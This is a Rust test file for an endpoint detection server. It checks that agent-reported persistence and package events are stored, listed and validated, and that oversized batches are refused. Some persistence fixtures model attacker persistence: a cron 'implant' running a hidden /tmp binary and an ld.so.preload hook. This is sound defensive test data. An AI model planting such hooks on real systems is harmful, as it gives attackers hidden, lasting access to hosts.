    let (status, _) = call(&app, "POST", "/api/admin/installers/generate", Some(&admin), Some(serde_json::json!({}))).await;
    assert_eq!(status, StatusCode::OK);
    let now = chrono::Utc::now().timestamp();
    let uri = format!("/api/admin/events/histogram?from={}&to={}&buckets=1", now - 60, now + 60);
    let audited = |histogram: &serde_json::Value| {
        histogram["series"].as_array().unwrap().iter().find(|series| series["event_type"] == "audit").map(|series| series["counts"][0].as_i64().unwrap())
    };

    let (_, for_admin) = call(&app, "GET", &uri, Some(&admin), None).await;
    assert_eq!(audited(&for_admin), Some(1));
    let (status, for_reader) = call(&app, "GET", &uri, Some(&admin_token("user")), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(audited(&for_reader), None);
}

fn persistence_event(action: &str, kind: &str, name: &str, path: &str, command: &str, hash: Option<&str>) -> serde_json::Value {
    serde_json::json!({
        "timestamp": 1794780000,
        "action": action,
        "kind": kind,
        "name": name,
        "path": path,
        "command": command,
        "user": "root",
        "enabled": true,
        "hash": hash,
    })
}

#[tokio::test]
async fn test_persistence_events_are_stored_with_the_fields_the_agent_sent() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "persistence-agent").await;
    let sent = [
        persistence_event("Present", "systemd_unit", "ssh.service", "/usr/lib/systemd/system/ssh.service", "/usr/sbin/sshd -D", Some("aa11")),
        persistence_event("Added", "cron", "*/5 * * * * root /tmp/.x", "/etc/cron.d/implant", "/tmp/.x", Some("bb22")),
        persistence_event("Changed", "shell_profile", ".bashrc", "/root/.bashrc", "", Some("cc33")),
        persistence_event("Removed", "ld_preload", "/tmp/.hook.so", "/etc/ld.so.preload", "", None),
    ];

    let body = agent.batch(serde_json::json!(sent.iter().map(|event| serde_json::json!({ "Persistence": event })).collect::<Vec<_>>()));
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);

    let stored: Vec<(String, i64, String)> = sqlx::query_as("SELECT event_type, timestamp, data FROM events WHERE agent_id = ? AND event_type = 'persistence' ORDER BY rowid")
        .bind("persistence-agent")
        .fetch_all(&pool)
        .await
        .unwrap();
    assert_eq!(stored.len(), sent.len());
    for ((event_type, timestamp, data), sent) in stored.iter().zip(&sent) {
        assert_eq!(event_type, "persistence");
        assert_eq!(*timestamp, 1794780000);
        assert_eq!(&serde_json::from_str::<serde_json::Value>(data).unwrap(), sent);
    }

    let (status, listed) = call(
        &app,
        "GET",
        "/api/admin/events?agent_id=persistence-agent&event_types=persistence",
        Some(&admin_token("user")),
        None,
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(listed.as_array().unwrap().len(), sent.len(), "the console reads them through the event list");
}

#[tokio::test]
async fn test_persistence_event_of_an_unknown_kind_is_refused() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "persistence-unknown-kind").await;

    let body = agent.batch(serde_json::json!([
        { "Persistence": persistence_event("Added", "browser_extension", "x", "/x", "", None) }
    ]));
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;

    assert_eq!(status, StatusCode::BAD_REQUEST);
    let stored: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'persistence'")
        .bind("persistence-unknown-kind")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(stored, 0);
}

fn package_event(action: &str, manager: &str, name: &str, version: &str, previous_version: Option<&str>) -> serde_json::Value {
    serde_json::json!({
        "timestamp": 1794780000,
        "action": action,
        "manager": manager,
        "name": name,
        "version": version,
        "architecture": "amd64",
        "previous_version": previous_version,
    })
}

#[tokio::test]
async fn test_package_events_are_stored_with_the_fields_the_agent_sent() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "package-agent").await;
    let sent = [
        package_event("Present", "dpkg", "openssl", "3.0.13-0ubuntu3", None),
        package_event("Added", "apk", "busybox", "1.37.0-r18", None),
        package_event("Changed", "dpkg", "openssl", "3.0.13-0ubuntu3.5", Some("3.0.13-0ubuntu3")),
        package_event("Removed", "dpkg", "netcat-openbsd", "1.226-1ubuntu2", None),
    ];

    let body = agent.batch(serde_json::json!(sent.iter().map(|event| serde_json::json!({ "Package": event })).collect::<Vec<_>>()));
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);

    let stored: Vec<(i64, String)> = sqlx::query_as("SELECT timestamp, data FROM events WHERE agent_id = ? AND event_type = 'package' ORDER BY rowid")
        .bind("package-agent")
        .fetch_all(&pool)
        .await
        .unwrap();
    assert_eq!(stored.len(), sent.len());
    for ((timestamp, data), sent) in stored.iter().zip(&sent) {
        assert_eq!(*timestamp, 1794780000);
        assert_eq!(&serde_json::from_str::<serde_json::Value>(data).unwrap(), sent);
    }

    let (status, listed) = call(&app, "GET", "/api/admin/events?agent_id=package-agent&event_types=package", Some(&admin_token("user")), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(listed.as_array().unwrap().len(), sent.len(), "the console reads them through the event list");
}

#[tokio::test]
async fn test_package_event_of_an_unknown_manager_is_refused() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "package-unknown-manager").await;

    let body = agent.batch(serde_json::json!([{ "Package": package_event("Added", "rpm", "openssl", "3.0.7", None) }]));
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;

    assert_eq!(status, StatusCode::BAD_REQUEST);
    let stored: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'package'")
        .bind("package-unknown-manager")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(stored, 0);
}

fn batch_of_exactly(agent: &mut TestAgent, bytes: usize) -> String {
    let process = |executable_path: String| {
        serde_json::json!([{
            "Process": {
                "timestamp": 1640995200,
                "pid": 1234,
                "ppid": 1000,
                "executable_path": executable_path,
                "command_line": [],
                "action": "Create",
                "uid": 1000,
                "hash": null
            }
        }])
    };

    let unpadded = agent.batch(process(String::new())).len();
    agent.seq -= 1;
    let body = agent.batch(process("x".repeat(bytes - unpadded)));
    assert_eq!(body.len(), bytes);
    body
}

#[tokio::test]
async fn test_event_batch_is_read_up_to_the_protocol_limit_and_refused_above_it() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "batch-limit-agent").await;
    let stored = || async {
        sqlx::query_scalar::<_, i64>("SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'process'")
            .bind("batch-limit-agent")
            .fetch_one(&pool)
            .await
            .unwrap()
    };

    let largest = batch_of_exactly(&mut agent, zedr_protocol::MAX_EVENT_BATCH_BYTES);
    let (status, _) = send_signed(&app, &agent, "/api/events", largest).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(stored().await, 1);

    let too_large = batch_of_exactly(&mut agent, zedr_protocol::MAX_EVENT_BATCH_BYTES + 1);
    let (status, _) = send_signed(&app, &agent, "/api/events", too_large).await;
    assert_eq!(status, StatusCode::PAYLOAD_TOO_LARGE);
    assert_eq!(stored().await, 1, "nothing of a refused batch is stored");

    let next = batch_of_exactly(&mut agent, 1024);
    let (status, _) = send_signed(&app, &agent, "/api/events", next).await;
    assert_eq!(status, StatusCode::OK, "a refused batch does not put the agent out of sequence");
    assert_eq!(stored().await, 2);
}
